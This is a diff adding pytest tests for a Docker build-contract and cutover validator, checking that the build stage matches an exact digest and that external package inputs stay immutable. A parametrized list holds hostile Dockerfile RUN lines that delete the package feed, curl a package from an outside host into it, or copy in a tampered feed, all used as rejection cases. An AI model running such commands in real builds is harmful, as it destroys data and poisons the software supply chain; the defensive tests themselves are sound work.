@@ -1505,6 +1505,7 @@ def test_public_pwa_dockerfile_has_exact_pinned_validator_stage_and_receipt_depe
         "proofStageNotDerived": True,
         "exactPackageFeedStageCount": True,
         "exactBuildStage": True,
+        "exactBuildStageInstructions": True,
         "exactToolFinalStage": True,
         "exactFinalStage": True,
         "exactStageSetAndOrder": True,
@@ -2660,6 +2661,181 @@ def mutate_portal_compose_build_syntax(
 
 
 @pytest.mark.parametrize(
+    "hostile_instruction",
+    (
+        "RUN find /opt/chummer-core-runtime-feed -type f -delete",
+        "RUN curl https://example.invalid/core.nupkg -o /opt/chummer-core-runtime-feed/hostile.nupkg",
+        "RUN cp -a /tmp/hostile-feed/. /opt/chummer-core-runtime-feed/",
+        "RUN rm -rf /opt/chummer-core-runtime-feed",
+    ),
+)
+def test_exact_build_stage_rejects_post_materialization_feed_mutation(
+    tmp_path: Path,
+    hostile_instruction: str,
+) -> None:
+    module = load_module()
+    cutover_module = load_cutover_module()
+    canonical = (
+        REPO_ROOT / "Chummer.Run.Api/Dockerfile"
+    ).read_text(encoding="utf-8")
+    boundary = (
+        "\nFROM mcr.microsoft.com/dotnet/aspnet:10.0@sha256:"
+        "1fa23fc4872d95fd71c2833ebe65d7e84a43b2d51a31d119516852f13d9505a7 "
+        "AS install-linking-postgres-tool-final\n"
+    )
+    assert boundary in canonical
+    hostile = canonical.replace(
+        boundary,
+        f"\n{hostile_instruction}{boundary}",
+        1,
+    )
+    dockerfile = tmp_path / "Dockerfile"
+    dockerfile.write_text(hostile, encoding="utf-8")
+
+    contract = module.validate_public_pwa_docker_build_contract(dockerfile)
+
+    assert contract["status"] == "fail"
+    assert contract["checks"]["exactBuildStageInstructions"] is False
+    assert any(
+        "exact immutable instruction digest" in failure
+        for failure in contract["failures"]
+    )
+    assert not cutover_module.docker_stage_instruction_contract_matches(
+        hostile,
+        stage="build",
+        expected_count=(
+            cutover_module.PUBLIC_EDGE_DOCKER_BUILD_STAGE_INSTRUCTION_COUNT
+        ),
+        expected_sha256=cutover_module.PUBLIC_EDGE_DOCKER_BUILD_STAGE_SHA256,
+    )
+
+
+def test_cutover_accepts_exact_current_v5_package_plane_and_rejects_open_core_schema() -> None:
+    module = load_cutover_module()
+    lock_path = REPO_ROOT / "eng/package-plane.lock.json"
+    recipe_path = REPO_ROOT / "scripts/ai/bootstrap-hub-package-feed.py"
+    authority_path = REPO_ROOT / "eng/core-main-runtime-artifact-authority.json"
+    payload = json.loads(lock_path.read_text(encoding="utf-8"))
+
+    assert module.GovernedCutoverRunner._validate_package_plane(
+        payload,
+        recipe_sha256=hashlib.sha256(recipe_path.read_bytes()).hexdigest(),
+        core_authority_sha256=hashlib.sha256(
+            authority_path.read_bytes()
+        ).hexdigest(),
+    ) == 12
+
+    payload["core_runtime"]["unreviewed"] = True
+    with pytest.raises(module.CutoverError, match="Core runtime package authority"):
+        module.GovernedCutoverRunner._validate_package_plane(
+            payload,
+            recipe_sha256=hashlib.sha256(recipe_path.read_bytes()).hexdigest(),
+            core_authority_sha256=hashlib.sha256(
+                authority_path.read_bytes()
+            ).hexdigest(),
+        )
+
+
+@pytest.mark.parametrize(
+    "mutation",
+    ("extra-entry", "mutable-directory", "mutable-file", "symlink"),
+)
+def test_external_core_bundle_input_is_exact_and_immutable(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    mutation: str,
+) -> None:
+    module = load_cutover_module()
+    payload = b"reviewed external artifact"
+    monkeypatch.setattr(module, "CORE_RUNTIME_BUNDLE_FILE_NAME", "bundle.zip")
+    monkeypatch.setattr(module, "CORE_RUNTIME_BUNDLE_DIRECTORY_NAME", "core-input")
+    monkeypatch.setattr(module, "CORE_RUNTIME_BUNDLE_SIZE_BYTES", len(payload))
+    monkeypatch.setattr(
+        module,
+        "CORE_RUNTIME_BUNDLE_SHA256",
+        hashlib.sha256(payload).hexdigest(),
+    )
+    source_root = tmp_path / "run-services"
+    source_root.mkdir()
+    bundle_root = tmp_path / "core-input"
+    bundle_root.mkdir(mode=0o755)
+    archive = bundle_root / "bundle.zip"
+    archive.write_bytes(payload)
+    archive.chmod(0o444)
+    bundle_root.chmod(0o555)
+    inputs = SimpleNamespace(source_root=source_root)
+
+    assert module.validate_core_runtime_bundle_input(inputs) == bundle_root
+
+    if mutation == "extra-entry":
+        bundle_root.chmod(0o755)
+        (bundle_root / "extra").write_text("hostile", encoding="utf-8")
+        bundle_root.chmod(0o555)
+    elif mutation == "mutable-directory":
+        bundle_root.chmod(0o755)
+    elif mutation == "mutable-file":
+        archive.chmod(0o644)
+    elif mutation == "symlink":
+        bundle_root.chmod(0o755)
+        archive.unlink()
+        archive.symlink_to(tmp_path / "outside.zip")
+        bundle_root.chmod(0o555)
+    else:  # pragma: no cover - parametrization is closed.
+        raise AssertionError(mutation)
+
+    with pytest.raises(module.CutoverError, match="Core runtime bundle"):
+        module.validate_core_runtime_bundle_input(inputs)
+
+
+@pytest.mark.parametrize(
+    "mutation",
+    ("extra-entry", "mutable-directory", "mutable-file", "changed-bytes"),
+)
+def test_external_hub_feed_input_is_exact_and_immutable(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    mutation: str,
+) -> None:
+    module = load_cutover_module()
+    payload = b"reviewed prebuilt Hub feed"
+    monkeypatch.setattr(module, "HUB_PACKAGE_FEED_DIRECTORY_NAME", "hub-feed")
+    monkeypatch.setattr(
+        module,
+        "HUB_PACKAGE_FEED_INPUTS",
+        {"feed.nupkg": (hashlib.sha256(payload).hexdigest(), len(payload))},
+    )
+    source_root = tmp_path / "run-services"
+    source_root.mkdir()
+    feed_root = tmp_path / "hub-feed"
+    feed_root.mkdir(mode=0o755)
+    package = feed_root / "feed.nupkg"
+    package.write_bytes(payload)
+    package.chmod(0o444)
+    feed_root.chmod(0o555)
+    inputs = SimpleNamespace(source_root=source_root)
+
+    assert module.validate_hub_package_feed_input(inputs) == feed_root
+
+    if mutation == "extra-entry":
+        feed_root.chmod(0o755)
+        (feed_root / "extra").write_text("hostile", encoding="utf-8")
+        feed_root.chmod(0o555)
+    elif mutation == "mutable-directory":
+        feed_root.chmod(0o755)
+    elif mutation == "mutable-file":
+        package.chmod(0o644)
+    elif mutation == "changed-bytes":
+        package.chmod(0o644)
+        package.write_bytes(b"hostile prebuilt Hub feed")
+        package.chmod(0o444)
+    else:  # pragma: no cover - parametrization is closed.
+        raise AssertionError(mutation)
+
+    with pytest.raises(module.CutoverError, match="Hub package feed"):
+        module.validate_hub_package_feed_input(inputs)
+
+
+@pytest.mark.parametrize(
     "mutation",
     (
         "explicit_pull",
@@ -2810,6 +2986,8 @@ def test_static_and_runtime_build_policies_share_one_authority() -> None:
         "PUBLIC_EDGE_BUILD_KEYS_BY_SERVICE",
         "PUBLIC_EDGE_BUILD_SERVICE_TARGETS",
         "PUBLIC_EDGE_COMPOSE_TOP_LEVEL_KEYS",
+        "PUBLIC_EDGE_DOCKER_BUILD_STAGE_INSTRUCTION_COUNT",
+        "PUBLIC_EDGE_DOCKER_BUILD_STAGE_SHA256",
         "PUBLIC_EDGE_DOCKER_COPY_STAGE_REFERENCES_BY_STAGE",
         "PUBLIC_EDGE_DOCKER_EXACT_NAMED_CONTEXT_COPIES_BY_STAGE",
         "PUBLIC_EDGE_DOCKER_NAMED_CONTEXTS_BY_STAGE",
@@ -2826,6 +3004,7 @@ def test_static_and_runtime_build_policies_share_one_authority() -> None:
         "docker_logical_instruction_records",
         "docker_logical_instructions",
         "dockerfile_parser_directive_findings",
+        "docker_stage_instruction_contract_matches",
         "public_edge_compose_build_syntax_failures",
         "public_edge_rendered_compose_failures",
         "rendered_build_contract_matches",
@@ -2875,6 +3054,13 @@ def render_synthetic_compose_config(
         "HOME": str(tmp_path),
         "LANG": "C",
         "LC_ALL": "C",
+        "CHUMMER_ACCOUNT_ERASURE_RECEIPT_HMAC_KEY": "0" * 64,
+        "CHUMMER_CORE_RUNTIME_BUNDLE_SOURCE": str(
+            synthetic_root / "core-runtime-bundle"
+        ),
+        "CHUMMER_HUB_PACKAGE_FEED_SOURCE": str(
+            synthetic_root / "hub-package-feed"
+        ),
         "CHUMMER_DATA_PROTECTION_CERTIFICATE_FILE": str(tmp_path / "cert"),
         "CHUMMER_DATA_PROTECTION_CERTIFICATE_PASSWORD_FILE": str(
             tmp_path / "cert-password"
@@ -3113,6 +3299,13 @@ def test_real_compose_interpolation_routes_every_cutover_build_context(
         "HOME": str(tmp_path),
         "LANG": "C",
         "LC_ALL": "C",
+        "CHUMMER_ACCOUNT_ERASURE_RECEIPT_HMAC_KEY": "0" * 64,
+        "CHUMMER_CORE_RUNTIME_BUNDLE_SOURCE": str(
+            synthetic_root / "core-runtime-bundle"
+        ),
+        "CHUMMER_HUB_PACKAGE_FEED_SOURCE": str(
+            synthetic_root / "hub-package-feed"
+        ),
         "CHUMMER_DATA_PROTECTION_CERTIFICATE_FILE": str(tmp_path / "cert"),
         "CHUMMER_DATA_PROTECTION_CERTIFICATE_PASSWORD_FILE": str(
             tmp_path / "cert-password"
@@ -3168,6 +3361,10 @@ def test_real_compose_interpolation_routes_every_cutover_build_context(
     assert completed.returncode == 0, completed.stderr
     rendered = json.loads(completed.stdout)
     expected_contexts = {
+        "core-runtime-bundle": str(synthetic_root / "core-runtime-bundle"),
+        "hub-package-feed-input": str(
+            synthetic_root / "hub-package-feed"
+        ),
         "design-product": str(design_product),
         "fleet-media-factory-contracts": str(fleet_contracts),
         "hub-registry-source": str(hub_registry),
@@ -5473,6 +5670,13 @@ def write_complete_marker_source_tree(module, source_root: Path) -> Path:
         path = source_root / relative_path
         path.parent.mkdir(parents=True, exist_ok=True)
         path.write_text("\n".join(markers) + "\n", encoding="utf-8")
+    for relative_path in (
+        "Chummer.Run.Api/Chummer.Run.Api.csproj",
+        "package-lock.json",
+    ):
+        path = source_root / relative_path
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_bytes((REPO_ROOT / relative_path).read_bytes())
     # Docker semantics are validated structurally, so this fixture must contain executable
     # instructions rather than a bag of marker strings.
     (source_root / module.PUBLIC_EDGE_DOCKERFILE_RELATIVE_PATH).write_text(
